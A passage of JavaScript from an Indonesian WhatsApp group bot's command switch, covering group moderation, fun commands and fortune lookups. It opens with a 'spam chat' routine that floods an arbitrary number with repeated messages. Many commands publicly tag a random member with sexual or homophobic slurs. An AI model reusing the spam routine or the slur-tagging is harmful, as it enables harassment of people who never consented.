Araa.sendMessage(nomor + '@s.whatsapp.net', { text: teks })
}
setReply(`Berhasil spam chat\nId : ${nomor}\nJumlah : ${q.split('|')[1]}\nPesan : ${teks}`)
}
} catch (err) {
console.log(err)
setReply(`${err}`)
}
break
case 'bagilimit':
case 'berbagilimit':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Format salah!\nCONTOH :\n ${prefix + command} ${nomerOwner} jumlah`)
if (mentionByReply) {
kurangLimit(senderNumber, parseInt(args[0]))
tambahLimit(Input.split('@')[0], parseInt(args[0]))
await setReply(`Berhasil Berbagi ${args[0]} Limit\n\nNo : ${Input.split('@')[0]}\nLimit Kamu : ${getLimit(senderNumber)}\nLimit Orgnya : ${getLimit(Input.split('@')[0])}️`)
} else if (mentionByTag && isGroup) {
kurangLimit(senderNumber, parseInt(args[1]))
tambahLimit(Input.split('@')[0], parseInt(args[1]))
await setReply(`Berhasil Berbagi ${args[1]} Limit\n\nNo : ${Input.split('@')[0]}\nLimit Kamu : ${getLimit(senderNumber)}\nLimit Orgnya : ${getLimit(Input.split('@')[0])}️`)
} else if (!isGroup) {
kurangLimit(senderNumber, parseInt(args[1]))
tambahLimit(`Input.split("@")[0]`, parseInt(args[1]))
await setReply(`Berhasil Berbagi ${args[1]} Limit\n\nNo : ${Input.split('@')[0]}\nLimit Kamu : ${getLimit(senderNumber)}\nLimit Orgnya : ${getLimit(Input.split('@')[0])}️`)
} else setReply('Tag atau Reply usernya')
break                    
//================================================================================\\
case 'antilink':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (isAntiLink) return setReply('Fitur sudah aktif kak')
antilink.push(from)
global.setDatabase('antilink.json', JSON.stringify(antilink))
console.log("database new")
setReply("Fitur antilink telah di aktifkan")
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (!isAntiLink) return setReply('Fitur Anti link sudah off')
antilink.splice(antilink.indexOf(from), 1)
global.setDatabase('antilink.json', JSON.stringify(antilink))
console.log("database new")
setReply("Fitur antilink telah di matikan")
} else if (!q) {
Araa.sendButMessage(from, `MODE ANTI LINK`, `Silahkan pilih salah satu`, [
{ buttonId: `${prefix}antilink on`, buttonText: { displayText: On }, type: 1 },
{ buttonId: `${prefix}antilink off`, buttonText: { displayText: Off }, type: 1 },])
}
break
case 'antilinkgc':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
antilinkgc.push(from)
global.setDatabase('antilinkgc.json', JSON.stringify(antilinkgc))
console.log("database new")                            
setReply(`Fitur antilink group telah di aktifkan`)
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (!isAntilinkGc) return setReply('Udah mati')
antilinkgc.splice(antilinkgc.indexOf(from), 1)
global.setDatabase('antilinkgc.json', JSON.stringify(antilinkgc))
console.log("database new")
setReply(`Fitur antilink group telah di matikan`)
} else if (!q) {
Araa.sendButMessage(from, `MODE ANTI LINK GROUP`, `Silahkan pilih salah satu`, [
{ buttonId: `${prefix}antilinkgc on`, buttonText: { displayText: On }, type: 1 },
{ buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: Off }, type: 1 },])
}
break
case 'antivirtex':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (isAntiVirtex) return setReply('Sudah aktif!!')
antivirtex.push(from)
global.setDatabase('antivirtex.json', JSON.stringify(antivirtex))
console.log("database new")                            
setReply('Sukses mengaktifkan antivirtex!')
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (!isAntiVirtex) return setReply('Udah off!!')
antivirtex.splice(antivirtex.indexOf(from), 1)
global.setDatabase('antivirtex.json', JSON.stringify(antivirtex))
console.log("database new")
setReply('Sukses mematikan antivirtex!')
} else if (!q) {
Araa.sendButMessage(from, `MODE Anti Virtex`, `Silahkan pilih salah satu`, [
{ buttonId: `${prefix}antivirtex on`, buttonText: { displayText: `on` }, type: 1 },
{ buttonId: `${prefix}antivirtex off`, buttonText: { displayText: `off` }, type: 1 },])
}
break
case 'antiasing':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (isKickarea) return setReply('Sudah aktif!!')
antiasing.push(from)
global.setDatabase('antiasing.json', JSON.stringify(antiasing))
console.log("database new")
setReply('Sukses mengaktifkan kickarea!')
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (!isKickarea) return setReply('Udah off!!')
antiasing.splice(antiasing.indexOf(from), 1)
global.setDatabase('antiasing.json', JSON.stringify(antiasing))
console.log("database new")
setReply('Sukses mematikan kickarea!')
} else if (!q) {
Araa.sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
{ buttonId: `${prefix}antiasing on`, buttonText: { displayText: `on` }, type: 1 },
{ buttonId: `${prefix}antiasing off`, buttonText: { displayText: `off` }, type: 1 },])
}
break
case 'antihidetag':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (isAntihidetag) return setReply('Fitur sudah aktif kak')
antihidetag.push(from)
global.setDatabase('antihidetag.json', JSON.stringify(antihidetag))
console.log("database new")
setReply(`Fitur anti hidetag telah di aktifkan`)
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (!isAntihidetag) return setReply('Fitur Anti link sudah off')
antihidetag.splice(antihidetag.indexOf(from), 1)
global.setDatabase('antihidetag.json', JSON.stringify(antihidetag))
console.log("database new")
setReply(`Fitur anti hidetag telah di matikan`)
} else if (!q) {
Araa.sendButMessage(from, `MODE ANTI TAG`, `Silahkan pilih salah satu`, [
{ buttonId: `${prefix}antihidetag on`, buttonText: { displayText: On }, type: 1 },
{ buttonId: `${prefix}antihidetag off`, buttonText: { displayText: Off }, type: 1 },])
}
break
case 'infogc':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
let _meta = await Araa.groupMetadata(from)
console.log(_meta)
let _img = await Araa.profilePictureUrl(_meta.id, 'image')
let caption =
`${_meta.subject} - Created on ${moment(_meta.creation * 1000).format('ll')}\n\n` +
`*${_meta.participants.length}* Total Members\n*${_meta.participants.filter((x) => x.admin === 'admin').length}* Admin\n*${_meta.participants.filter((x) => x.admin === null).length}* Not Admin\n\n` +
`Group ID : ${_meta.id}`
await Araa.sendMessage(from, { caption, image: await getBuffer(_img), }, { quoted: m })
}
break
case 'linkgc':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
var url = await Araa.groupInviteCode(from).catch(() => reply(mess.error.api))
let asu = 'https://chat.whatsapp.com/' + url
setReply(asu)
}
break
case 'setppgc':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (isImage || isQuotedImage) {
let media = await Araa.downloadAndSaveMediaMessage(quoted)
await Araa.updateProfilePicture(from, { url: media }).then((res) => {
setReply(`Sukses`)
fs.unlinkSync(media)
}).catch(() => reply(mess.error.api))
} else {
setReply(`Kirim/balas gambar dengan caption ${command}`)
}
}
break
case 'setnamagc':
case 'setnamegc':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
await Araa.groupUpdateSubject(from, q)
.then((res) => {
setReply(`Sukses`)
}).catch(() => setReply(mess.error.api))
break
case 'setdesc':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
await Araa.groupUpdateDescription(from, q).then((res) => {
setReply(`Sukses`)
}).catch(() => reply(mess.error.api))
break
case 'gc':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!q) return reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
if (args[0] == 'close') {
Araa.groupSettingUpdate(from, 'announcement')
setReply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == 'open') {
Araa.groupSettingUpdate(from, 'not_announcement')
setReply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
setReply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
}
break
case 'revoke':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
await Araa.groupRevokeInvite(from)
.then((res) => {
setReply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
break
case 'hidetag':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
let mem = []
groupMembers.map((i) => mem.push(i.id))
Araa.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case 'infoall':
case 'tagall':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!q) {
var inpo = 'No inpo'
} else var inpo = q
let members_id = []
let tes = '\n'
await groupMembers.map((i) => {
tes += `┣ ⬣@${i.id.split('@')[0]}\n`
members_id.push(i.id)
})
mentions(`
*From :* ${pushname}

 Info :  ${inpo}

Total Member : ${groupMembers.length} 

┏━⬣` + tes + `┗━⬣`,
members_id, false)
break
case 'kick':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!Input) return setReply('Tag/Mention/Masukan nomer target')
if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
await Araa.groupParticipantsUpdate(from, [Input], 'remove').then((res) => setReply(`Berhasil mengeluarkan  ${Input.split('@')[0]} ke dalam group ${groupName}`)).catch((err) => setReply(jsonformat(err)))
}
break
case 'add':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!Input) return setReply('Tag/Mention/Masukan nomer target')
if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
await Araa.groupParticipantsUpdate(from, [Input], 'add').then((res) => setReply(`Berhasil menambahkan ${Input.split('@')[0]} ke dalam group ${groupName}`)).catch((err) => setReply(jsonformat(err)))
}
break
case 'demote':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
await Araa.groupParticipantsUpdate(from, [users], 'demote').then((res) => setReply(`Sukses Demote ${users}`)).catch((err) => setReply(jsonformat(err)))
}
break
case 'admin':
case 'promote':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
await Araa.groupParticipantsUpdate(from, [users], 'promote').then((res) => setReply(`Sukses Promote ${users}`)).catch((err) => setReply(jsonformat(err)))
}
break
case 'closetime':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return setReply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
setReply(`Close time ${q} dimulai dari sekarang`)
setTimeout(() => {
var nomor = m.participant
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
Araa.groupSettingUpdate(from, 'announcement')
setReply(close)
}, timer)
break
case 'opentime':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return setReply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
setReply(`Open time ${q} dimulai dari sekarang`)
setTimeout(() => {
var nomor = m.participant
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
Araa.groupSettingUpdate(from, 'not_announcement')
setReply(open)
}, timer)
break
case 'kickme':
try {
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isBanchat) return 
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
await Araa.groupParticipantsUpdate(from, [sender], 'remove')
await setReply('Done wkwkw')
} catch (err) {
setReply(`${err}`)
}
break
case 'mute':
case 'banchat':{
if (isGroup && !isSewa) return onlySewa()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (isBanchat) return setReply(`udah di ban`)
banchat.push(from)
global.setDatabase('banchat.json', JSON.stringify(banchat))
console.log("database new")
setReply(`Bot berhasil Ban di group ini`)
}
break
case 'unmute':
case 'unbanchat':{
if (isGroup && !isSewa) return onlySewa()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!isBanchat) return setReply(`udah di UnBan`)
banchat.splice(banchat.indexOf(from), 1)
global.setDatabase('banchat.json', JSON.stringify(banchat))
console.log("database new")
setReply(`Bot telah di Unban di group ini`)
}
break
case 'ban':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (q.startsWith('+')) {
let woke = q.replace(new RegExp('[()+-/ +/]', 'gi'), '')
let Name = await Araa.getName(woke)
console.log(woke)
if (cekBannedUser(woke, ban)) return setReply('Udah di ban kak')
addBanned(Name, calender, woke, ban)
setReply(`Berhasil banned ${woke}`)
} else if (users) {
let Nomer = `${users.split('@')[0]}`
if (cekBannedUser(Nomer, ban)) return setReply('Udah di ban kak')
let Name = await Araa.getName(users)
addBanned(Name, calender, Nomer, ban)
setReply(`Berhasil banned ${users.split('@')[0]}`)
} else setReply('Reply atau tag targetnya')
}
break
case 'unban':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (q.startsWith('+')) {
let woke = q.replace(new RegExp('[()+-/ +/]', 'gi'), '')
if (!cekBannedUser(woke, ban)) return setReply('Udah di unban kak')
unBanned(woke, ban)
setReply(`Berhasil unbanned ${woke}`)
} else if (users) {
let Nomer = `${users.split('@')[0]}`
if (!cekBannedUser(Nomer, ban)) return setReply('Udah di unban kak')
unBanned(Nomer, ban)
setReply(`Berhasil unbanned ${users.split('@')[0]}`)
} else setReply('Reply atau tag targetnya')
}
break
case 'getppgc':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
onlyWait()
try {
var ppimg = await Araa.profilePictureUrl(from, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await Araa.sendMessage(from, { image: { url: ppimg } }, { quoted: m })
break
case 'getpp':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isGroup) {
if (mentionByTag) {
console.log(mentionByTag[0])
try {
var ppimg = await Araa.profilePictureUrl(mentionByTag[0], 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await Araa.sendMessage(from, { caption: 'Nih', image: { url: ppimg } }, { quoted: m })
} else if (mentionByReply) {
try {
var ppimg = await Araa.profilePictureUrl(mentionByReply, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await Araa.sendMessage(from, { contextInfo: { forwardingScore: 2, isForwarded: true }, caption: 'Nih', image: { url: ppimg } }, { quoted: m })
}
} else if (!isGroup) {
try {
var ppimg = await Araa.profilePictureUrl(from, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await Araa.sendMessage(from, { caption: 'Nih', image: { url: ppimg } }, { quoted: m })
}
break
case 'getname':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isGroup) {
console.log(users)
const sname = await Araa.getName(users)
setReply(sname)
} else if (!isGroup) {
const yahu = await Araa.getName(users)
setReply(yahu)
} else {
setReply('Reply targetnya')
}
break
case 'listonline':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
Araa.sendText(from, 'List Online:\n\n' + online.map((v) => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break
case 'getidgc':
if (!isGroup) return onlyGroup()
Araa.sendMessage(from, { 
text: '', 
templateButtons: [{ index: 1, 
urlButton: { displayText: `Copy Code`, 
url: `https://www.whatsapp.com/otp/copy/${from}`}}],
footer: fake })
break
case 'afk':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (cekAfk(from, sender)) return setReply('Kamu sedang afk')                        
addAfk(from, pushname, sender)
setReply(`Kamu telah afk`)
}
break
//================================================================================\\
case 'ngewe':
case 'memek':
case 'bego':
case 'goblok':
case 'janda':
case 'perawan':
case 'babi':
case 'tolol':
case 'pinter':
case 'pintar':
case 'asu':
case 'bodoh':
case 'gay':
case 'lesby':
case 'bajingan':
case 'jancok':
case 'anjing':
case 'ngentod':
case 'ngentot':
case 'monyet':
case 'mastah':
case 'newbie':
case 'bangsat':
case 'bangke':
case 'sange':
case 'sangean':
case 'dakjal':
case 'horny':
case 'wibu':
case 'puki':
case 'pantex':
case 'pantek':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
Araa.sendMessage(from, { text: `yang paling ${command} di sini adalah @${org.split('@')[0]}`, mentions: [org] }, { quoted: setQuoted })
}
break
case 'jadian':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
let member = participants.map((u) => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee Yang Jadian💖 Jangan Lupa Pajak Jadiannya Yaa🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
Araa.sendMessage(from, { text: jawab, mentions: menst })
}
break
case 'jodohku':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
let member = participants.map((u) => u.id)
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `jodoh kamu adalah @${jodoh.split('@')[0]}`
let menst = [jodoh]
Araa.sendMessage(from, { text: jawab, mentions: menst }, { quoted: m })
}
break
case 'tagme':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
let menst = [sender]
Araa.sendMessage(from, { text: `@${senderNumber}`, mentions: menst })
}
break
case 'totag':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return onlyGroup()
if (!mentionByReply) return setReply('reply targetnya')
let menst = [mentionByReply]
Araa.sendMessage(from, { text: `@${mentionByReply.split('@')[0]}`, mentions: menst })
}
break
case 'reqtag':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isGroup) return setReply(mess.only.group)
if (!mentionByReply) return setReply('Reply targetnya')
if (!q) return setReply('Text?')
let menst = [mentionByReply]
Araa.sendMessage(from, { text: `${q} @${mentionByReply.split('@')[0]}`, mentions: menst })
}
break
//================================================================================\\
case 'cekbapak':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const cek = bapak[Math.floor(Math.random() * bapak.length)]
setReply(cek)
break
case 'bucin':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const sa = ngebucin[Math.floor(Math.random() * ngebucin.length)]
Araa.sendMessage(from, { text: '' + sa + '\n\n_-BUCIN._' }, { quoted: setQuoted })
break
case 'katailham':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const afa = ilhamberkata[Math.floor(Math.random() * ilhamberkata.length)]
Araa.sendMessage(from, { text: '' + afa + '\n\n_-Ilham._' }, { quoted: setQuoted })
break
case 'truth':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const ttrth = trut[Math.floor(Math.random() * trut.length)]
setReply(ttrth)
break
case 'dare':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const der = dare[Math.floor(Math.random() * dare.length)]
setReply(der)
break
case 'bisakah':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const bisakah = body.slice(0)
const keh = bisa[Math.floor(Math.random() * bisa.length)]
Araa.sendMessage(from, { text: 'Pertanyaan : *' + bisakah + '*\n\nJawaban : ' + keh }, { quoted: setQuoted })
break
case 'kapankah':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const kapankah = body.slice(0)
const koh = kapan[Math.floor(Math.random() * kapan.length)]
Araa.sendMessage(from, { text: 'Pertanyaan : *' + kapankah + '*\n\nJawaban : ' + koh }, { quoted: setQuoted })
break
case 'apakah':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const apakah = body.slice(0)
const kah = apa[Math.floor(Math.random() * apa.length)]
Araa.sendMessage(from, { text: 'Pertanyaan : *' + apakah + '*\n\nJawaban : ' + kah }, { quoted: setQuoted })
break
case 'bagaimanakah':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const bagaimanakah = body.slice(0)
const mana = bagai[Math.floor(Math.random() * bagai.length)]
Araa.sendMessage(from, { text: 'Pertanyaan : *' + bagaimanakah + '*\n\nJawaban : ' + mana }, { quoted: setQuoted })
break
case 'goblokcek':
case 'jelekcek':
case 'gaycek':
case 'rate':
case 'lesbicek':
case 'gantengcek':
case 'cantikcek':
case 'begocek':
case 'suhucek':
case 'pintercek':
case 'jagocek':
case 'nolepcek':
case 'babicek':
case 'bebancek':
case 'baikcek':
case 'jahatcek':
case 'anjingcek':
case 'haramcek':
case 'pakboycek':
case 'pakgirlcek':
case 'sangecek':
case 'bapercek':
case 'fakboycek':
case 'alimcek':
case 'suhucek':
case 'fakgirlcek':
case 'kerencek':
case 'wibucek':
case 'pasarkascek':
case 'kulcek':                
case 'cekgoblok':
case 'cekjelek':
case 'cekgay':                
case 'ceklesbi':
case 'cekganteng':
case 'cekcantik':
case 'cekbego':
case 'ceksuhu':
case 'cekpinter':
case 'cekjago':
case 'ceknolep':
case 'cekbabi':
case 'cekbeban':
case 'cekbaik':
case 'cekjahat':
case 'cekanjing':
case 'cekharam':
case 'cekpakboy':
case 'cekpakgirl':
case 'ceksange':
case 'cekbaper':
case 'cekfakboy':
case 'cekalim':
case 'ceksuhu':
case 'cekfakgirl':
case 'cekkeren':
case 'cekwibu':
case 'cekpasarkas':
case 'cekkul':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const cex = body.slice(0)
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
Araa.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${mentionByReply.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: setQuoted })
} else if (mentionByTag[0] && isGroup) {
Araa.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${mentionByTag[0].split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: setQuoted })
} else if (!mentionByReply && !mentionByTag[0]) {
Araa.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${sender.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [sender] }, { quoted: setQuoted })
}
break
case 'watakcek':
case 'cekwatak':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const watak = body.slice(0)
const tak = wa[Math.floor(Math.random() * wa.length)]
Araa.sendMessage(from, { text: 'Pertanyaan : *' + watak + '*\n\nJawaban : ' + tak }, { quoted: setQuoted })
break
case 'hobbycek':
case 'cekhobby':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const hobby = body.slice(0)
const by = hob[Math.floor(Math.random() * hob.length)]
Araa.sendMessage(from, { text: 'Pertanyaan : *' + hobby + '*\n\nJawaban : ' + by }, { quoted: setQuoted })
break
case 'halah':
case 'hilih':
case 'huluh':
case 'heleh':
case 'holoh':{
if (!mentionByReply && !q) return setReply(`Kirim/reply text dengan caption ${prefix + command}`)
let ter = command[1].toLowerCase()
let tex = m.quoted ? (m.quoted.text ? m.quoted.text : q ? q : m.text) : q ? q : m.text
setReply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
}
break
//================================================================================\\
case 'nomerhoki':
case 'nomorhoki':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 6288292024190`)
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`,},{ quoted: setQuoted })
}
break
case 'artimimpi':
case 'tafsirmimpi':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}` }, { quoted: setQuoted })
}
break
case 'ramalanjodoh':
case 'ramaljodoh':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
